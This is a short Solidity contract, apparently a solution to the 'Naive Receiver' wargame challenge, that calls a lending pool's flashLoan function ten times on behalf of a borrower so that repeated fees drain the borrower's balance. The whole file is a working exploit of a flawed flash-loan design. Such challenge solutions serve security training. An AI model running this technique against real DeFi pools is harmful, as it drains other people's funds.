// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool private pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }
    
    function attack(address borrower) external {
        for(uint8 i; i < 10; i++) {
            pool.flashLoan(borrower, 0);
        }
    }
}
